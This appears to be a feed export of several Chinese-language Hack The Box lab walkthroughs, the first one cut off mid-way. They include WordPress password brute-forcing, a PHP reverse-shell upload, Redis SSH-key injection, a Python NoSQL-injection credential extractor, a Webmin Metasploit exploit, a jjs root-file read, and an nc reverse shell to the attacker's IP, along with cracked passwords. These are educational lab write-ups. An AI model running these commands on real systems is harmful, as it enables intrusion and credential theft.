<h2 id="wordpress爆破"><a href="#wordpress爆破" class="headerlink" title="wordpress爆破"></a>wordpress爆破</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">枚举用户名</span><br><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.80.34 -e u   </span><br><span class="line">密码爆破</span><br><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.80.34 -U users -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt   </span><br><span class="line">获得密码</span><br><span class="line">barney:spooky1</span><br><span class="line">stephen:apollo1</span><br></pre></td></tr></table></figure>
<h2 id="登录wordpress"><a href="#登录wordpress" class="headerlink" title="登录wordpress"></a>登录wordpress</h2><p>发现可用插件<br><img src="https://img-blog.csdnimg.cn/2020042221460473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="上传反弹shell"><a href="#上传反弹shell" class="headerlink" title="上传反弹shell"></a>上传反弹shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip web.zip index.html sh.php</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200425165127936.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200422215105119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h2><p>本机侦听4444</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
<p>访问192.168.80.34/wp-content/uploads/articulate_uploads/pass/sh.php<br>获得shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>切换用户<br><img src="https://img-blog.csdnimg.cn/20200422220656838.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">发现 另一个组 pcap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200422220654472.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip add</span><br><span class="line">发现是广播</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200422220833753.png" alt="在这里插入图片描述"><br>获取数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time 300 tcpdump -i vethaa5c167 -w node.pcap </span><br><span class="line">tcpdump -r node.pcap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200422221139548.png" alt="在这里插入图片描述"><br>切换用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su paul</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200422221245158.png" alt="在这里插入图片描述"><br>SUID提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u peter &#x2F;usr&#x2F;sbin&#x2F;service  ..&#x2F;..&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200422221455238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;passwd root         </span><br><span class="line">Password: 111</span><br><span class="line">su root</span><br><span class="line">Password: 111</span><br></pre></td></tr></table></figure>
<p>END<br><img src="https://img-blog.csdnimg.cn/20200422221727691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>HTB-postman</title>
    <url>/2020/04/09/HTB-postman/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -oA path postman.htb</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek&#39;s Personal Website</span><br><span class="line">10000&#x2F;tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-title: Login to Webmin</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>发现19.1版本的webmin，但是多次测试之后发现无法似乎未开启密码重置功能。<br>上网看了一圈 发现nmap未扫到的redis端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE    VERSION                                </span><br><span class="line">6379&#x2F;tcp open  tcpwrapped</span><br></pre></td></tr></table></figure>

<h1 id="redis-未授权访问"><a href="#redis-未授权访问" class="headerlink" title="redis 未授权访问"></a>redis 未授权访问</h1><h2 id="生成ssh公钥，写入redis"><a href="#生成ssh公钥，写入redis" class="headerlink" title="生成ssh公钥，写入redis"></a>生成ssh公钥，写入redis</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">生成ssh公钥</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">写入redis</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | redis-cli -h 10.10.10.160 -x set xxx</span><br></pre></td></tr></table></figure>
<h2 id="连接redis-导入公钥"><a href="#连接redis-导入公钥" class="headerlink" title="连接redis,导入公钥"></a>连接redis,导入公钥</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">连接redis</span><br><span class="line">redis-cli -h 10.10.10.160</span><br><span class="line">导入公钥</span><br><span class="line">config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h2 id="ssh连接redis"><a href="#ssh连接redis" class="headerlink" title="ssh连接redis"></a>ssh连接redis</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure>
<p>查看一下user.txt位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis@Postman:&#x2F;opt$ locate user.txt                   </span><br><span class="line">&#x2F;home&#x2F;Matt&#x2F;user.txt  </span><br><span class="line">redis@Postman:&#x2F;opt$ ls -la &#x2F;home&#x2F;Matt&#x2F;user.txt    </span><br><span class="line">-rw-rw---- 1 Matt Matt 33 Aug 26 03:07 &#x2F;home&#x2F;Matt&#x2F;user.txt</span><br></pre></td></tr></table></figure>
<h2 id="获得Matt私钥"><a href="#获得Matt私钥" class="headerlink" title="获得Matt私钥"></a>获得Matt私钥</h2><p>发现需要获得Matt密码，通过nmap扫描结果可以知道靶机开启了ssh，所以找找Matt的ssh私钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis@Postman:&#x2F;opt$ locate id_rsa*                         </span><br><span class="line">&#x2F;opt&#x2F;id_rsa.bak  </span><br><span class="line">redis@Postman:&#x2F;opt$ ls -la &#x2F;opt&#x2F;id_rsa.bak           </span><br><span class="line">-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 &#x2F;opt&#x2F;id_rsa.bak</span><br></pre></td></tr></table></figure>
<h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><p>使用john在攻击机上进行密码爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py Matt_pass.txt &gt; pass</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt pass</span><br></pre></td></tr></table></figure>
<p>获得Matt用户密码：computer2008  </p>
<h1 id="切换用户，获取flag"><a href="#切换用户，获取flag" class="headerlink" title="切换用户，获取flag"></a>切换用户，获取flag</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis@Postman:&#x2F;opt$ su Matt               </span><br><span class="line">Password:                                           </span><br><span class="line">Matt@Postman:~$ wc -c user.txt              </span><br><span class="line">33 user.txt</span><br></pre></td></tr></table></figure>

<h1 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h1><p>发现webmin为19.1版本，使用msf中的模块获取root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search webmin</span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_backdoor) &gt; use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce </span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; setg username Matt      </span><br><span class="line">username &#x3D;&gt; Matt </span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; setg password computer2008 </span><br><span class="line">password &#x3D;&gt; computer2008  </span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; set rhosts 10.10.10.160 </span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.160</span><br></pre></td></tr></table></figure>
<p>值得注意的是需要设置 ssl 为 true<br>否则无法建立连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; set ssl true </span><br><span class="line">ssl &#x3D;&gt; true</span><br></pre></td></tr></table></figure>
<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc -c &#x2F;root&#x2F;root.txt</span><br><span class="line">33 &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>HTB-mango</title>
    <url>/2020/04/09/HTB-mango/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="nosql注入-【mangodb】"><a href="#nosql注入-【mangodb】" class="headerlink" title="nosql注入 【mangodb】"></a>nosql注入 【mangodb】</h2><blockquote>
<p><a href="https://www.freebuf.com/articles/database/95314.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/95314.html</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads</a></p>
</blockquote>
<h2 id="jjs"><a href="#jjs" class="headerlink" title="jjs"></a>jjs</h2><p>jjs是个基于Nashorn引擎的命令行工具。它接受一些JavaScript源代码为参数，并且执行这些源代码</p>
<blockquote>
<p> <a href="https://gtfobins.github.io/gtfobins/jjs/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/</a></p>
</blockquote>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|_  256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">80&#x2F;tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;ssl Apache httpd (SSL-only mode)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">|_Not valid after:  2020-09-26T14:21:19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br></pre></td></tr></table></figure>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>浏览站点，没有可用信息<br>发现端口扫描中有个<strong>commonName=staging-order.mango.htb</strong>字段，加入到<strong>/etc/hosts</strong>中，浏览站点。<br><img src="https://img-blog.csdnimg.cn/20200227115618576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何发现这是nosql注入的攻击点呢———-只能说是经验之谈了</p>
<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><p>发现是mango联想到mangodb</p>
<h2 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h2><p><img src="https://img-blog.csdnimg.cn/20200227122418458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227122545394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="编写用户、密码爆破脚本"><a href="#编写用户、密码爆破脚本" class="headerlink" title="编写用户、密码爆破脚本"></a>编写用户、密码爆破脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#conding&#x3D;utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;staging-order.mango.htb&#x2F;index.php&quot;</span><br><span class="line">Cookie &#x3D; &#123;&quot;PHPSESSID&quot; : &quot;junr7pn15rsibkd4q7fjtnrfj7&quot;&#125;</span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: &quot;staging-order.mango.htb&quot;&#125;</span><br><span class="line">possible_chars &#x3D; list(string.ascii_letters)+list(string.digits)+[&quot;\\&quot;+c for c in string.punctuation+string.whitespace]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_password(name):</span><br><span class="line">    print(&quot;Using &quot;+name+&quot; found password&quot;)</span><br><span class="line">    password &#x3D; &quot;^&quot;</span><br><span class="line">    param &#x3D; &#123;&quot;username[$regex]&quot;: name, &quot;password[$regex]&quot;: &quot;&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span><br><span class="line">    while True:</span><br><span class="line">        for char in possible_chars:</span><br><span class="line">            param[&quot;password[$regex]&quot;] &#x3D; password + char + &quot;.*&quot;</span><br><span class="line">            res &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">            if int(res.status_code) &#x3D;&#x3D; 302:   </span><br><span class="line">                password +&#x3D; char			# 匹配成功则拼接字符，继续匹配下个字符</span><br><span class="line">                break</span><br><span class="line">        if char &#x3D;&#x3D; possible_chars[-1]:</span><br><span class="line">            print(&quot;Username &quot;+name+&quot; password &quot; + password[1:].replace(&quot;\\&quot;, &quot;&quot;))</span><br><span class="line">    		return password[1:].replace(&quot;\\&quot;, &quot;&quot;)   #剔除转移字符  \ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_name():</span><br><span class="line">    usernames &#x3D; []</span><br><span class="line">    param &#x3D; &#123;&quot;username[$regex]&quot;: &quot;&quot;, &quot;password[$regex]&quot;: &quot;.*&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span><br><span class="line">    for char in possible_chars:</span><br><span class="line">        username &#x3D; &quot;^&quot; + char    </span><br><span class="line">        param[&quot;username[$regex]&quot;] &#x3D; username + &quot;.*&quot;    # 如^a.*，匹配a开头的任意长度字符 </span><br><span class="line">        res &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">        if int(res.status_code) &#x3D;&#x3D; 302:					# 如果该字符匹配成功继续匹配之后的字符</span><br><span class="line">            print(&quot;username start with&quot; + username)</span><br><span class="line">            while True:</span><br><span class="line">                for char2 in possible_chars:</span><br><span class="line">                    param[&quot;username[$regex]&quot;] &#x3D; username + char2 + &quot;.*&quot;</span><br><span class="line">                    res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">                    if int(res2.status_code) &#x3D;&#x3D; 302:		#匹配成功则继续匹配，否则更换字符进行匹配</span><br><span class="line">                        username &#x3D; username + char2</span><br><span class="line">                        print(username)</span><br><span class="line">                        break</span><br><span class="line">                if char2 &#x3D;&#x3D; possible_chars[-1]:    # 匹配到最后一个字符，说明匹配完成</span><br><span class="line">                    print(&quot;Found username &quot; + username[1:])</span><br><span class="line">                    usernames.append(username[1:])  </span><br><span class="line">                    break</span><br><span class="line">  return usernames</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for name in get_name():</span><br><span class="line">	t1 &#x3D; threading.Thread(target&#x3D;get_password,args&#x3D;(name,))</span><br><span class="line">	t1.start()</span><br></pre></td></tr></table></figure>
<h2 id="获得用户、密码"><a href="#获得用户、密码" class="headerlink" title="获得用户、密码"></a>获得用户、密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin   t9KcS3&gt;!0B#2</span><br><span class="line">mango   h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure>

<h1 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h1><p>admin无法直接登录，使用mango登录成功<br>在mango目录下没有flag，在admin目录下发现flag<br>转到admin用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mango@mango:&#x2F;home&#x2F;admin$ ls</span><br><span class="line">user.txt</span><br><span class="line">mango@mango:&#x2F;home&#x2F;admin$ su admin</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure>
<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ wc -c user.txt</span><br><span class="line">33 user.txt</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ find &#x2F; -user root -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200227124651840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现jjs</p>
<h2 id="使用jjs进行文件读取"><a href="#使用jjs进行文件读取" class="headerlink" title="使用jjs进行文件读取"></a>使用jjs进行文件读取</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;var BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);</span><br><span class="line">var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);</span><br><span class="line">var br &#x3D; new BufferedReader(new FileReader(&quot;**&#x2F;root&#x2F;root.txt**&quot;));</span><br><span class="line">while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;&#39; | jjs</span><br></pre></td></tr></table></figure>

<h1 id="脚本格式错误"><a href="#脚本格式错误" class="headerlink" title="脚本格式错误"></a>脚本格式错误</h1><p>在windows下编写脚本，复制到linux下，报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为这个文件是直接从别处复制的，可能创建在windows下，多了\r字符。</span><br><span class="line">解决方法</span><br><span class="line">使用VIM打开文本</span><br><span class="line">:set ff 然后回车，我这个文件显示为dos格式。</span><br><span class="line">:set ff&#x3D;unix 回车，设置为unix格式。</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>HTB-nest</title>
    <url>/2020/04/09/HTB-nest/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">445&#x2F;tcp open  microsoft-ds?</span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -7h58m15s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-22T13:12:14</span><br><span class="line">|_  start_date: 2020-02-22T13:08:04</span><br><span class="line">4386&#x2F;tcp open  unknown</span><br></pre></td></tr></table></figure>




<p>SMB linux&amp;windows共享文件</p>
<p>其中：get 只能一个文件一个文件下载。</p>
<p>解决方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb:&#x2F;&gt;recurse on</span><br><span class="line">smb:&#x2F;&gt;prompt off</span><br><span class="line">smb:&#x2F;&gt;mget  *</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>HTB-sniper</title>
    <url>/2020/04/09/HTB-sniper/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80&#x2F;tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135&#x2F;tcp open  tcpwrapped</span><br><span class="line">139&#x2F;tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m47s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-24T18:04:23</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure>
<p>浏览网站，发现是文件包含漏洞</p>
<h1 id="文件包含技巧"><a href="#文件包含技巧" class="headerlink" title="文件包含技巧"></a>文件包含技巧</h1><blockquote>
<p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
</blockquote>
<p>发现得使用smb进行远程文件包含</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/5139" target="_blank" rel="noopener">https://xz.aliyun.com/t/5139</a></p>
</blockquote>
<h1 id="上传nc获得反弹shell"><a href="#上传nc获得反弹shell" class="headerlink" title="上传nc获得反弹shell"></a>上传nc获得反弹shell</h1><p><img src="https://img-blog.csdnimg.cn/20200225164711779.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><a href="https://www.cnblogs.com/broadview/archive/2010/10/27/1862836.html" target="_blank" rel="noopener">https://www.cnblogs.com/broadview/archive/2010/10/27/1862836.html</a></p>
</blockquote>
<h1 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h1><h2 id="发现密码"><a href="#发现密码" class="headerlink" title="发现密码"></a>发现密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\inetpub\wwwroot\user&gt;type db.php</span><br><span class="line">type db.php</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; Enter your Host, username, password, database below.</span><br><span class="line">&#x2F;&#x2F; I left password empty because i do not set password on localhost.</span><br><span class="line">$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz&#x2F;B8xQ~2VM&quot;,&quot;sniper&quot;);</span><br><span class="line">&#x2F;&#x2F; Check connection</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="获取用户名"><a href="#获取用户名" class="headerlink" title="获取用户名"></a>获取用户名</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\users&gt; dir</span><br><span class="line">d-----         4&#x2F;9&#x2F;2019   6:47 AM                Administrator    </span><br><span class="line">d-----        4&#x2F;11&#x2F;2019   7:04 AM                Chris       </span><br><span class="line">d-r---         4&#x2F;9&#x2F;2019   6:47 AM                Public</span><br></pre></td></tr></table></figure>
<h2 id="更改nc权限"><a href="#更改nc权限" class="headerlink" title="更改nc权限"></a>更改nc权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Get-Acl 查看文件权限</span><br><span class="line">&gt; PS C:\tmp&gt; cacls .&#x2F;nc.exe &#x2F;t &#x2F;e &#x2F;g everyone:f         </span><br><span class="line">cacls .&#x2F;nc.exe &#x2F;t &#x2F;e &#x2F;g everyone:f                           </span><br><span class="line">processed file: C:\tmp\nc.exe</span><br></pre></td></tr></table></figure>
<h2 id="获取user的powershell"><a href="#获取user的powershell" class="headerlink" title="获取user的powershell"></a>获取user的powershell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$username &#x3D; &#39;sniper\chris&#39;</span><br><span class="line">$Password &#x3D; ConvertTo-SecureString &quot;36mEAhz&#x2F;B8xQ~2VM&quot; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential($UserName,$Password)</span><br><span class="line">Invoke-Command  -ScriptBlock &#123; C:\tmp\nc.exe 10.10.15.172 7777 -e powershell.exe &#125; -Credential $cred -Verbose -computer localhost</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。</span><br><span class="line"></span><br><span class="line">powershell set-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.jb51.net/article/131535.htm" target="_blank" rel="noopener">https://www.jb51.net/article/131535.htm</a></p>
</blockquote>
<h2 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\users\chris\desktop&gt; dir</span><br><span class="line">Mode                LastWriteTime         Length Name          </span><br><span class="line">----                -------------         ------ ----  </span><br><span class="line">-a----        4&#x2F;11&#x2F;2019   8:15 AM             32 user.txt</span><br></pre></td></tr></table></figure>

